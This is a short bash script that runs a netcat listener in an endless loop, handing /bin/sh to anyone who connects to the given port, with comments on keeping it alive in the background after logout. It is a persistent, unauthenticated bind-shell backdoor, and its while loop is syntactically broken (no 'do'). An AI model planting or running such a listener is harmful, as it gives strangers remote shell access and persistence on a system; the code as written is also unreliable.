#!/bin/bash
# Execute: 'nohup netcat_listener.sh &' to run in background 
# and remain running after user logout
# Set permissions to 555
while [ 1 ]; nc -l -p <PORT> -e /bin/sh; done
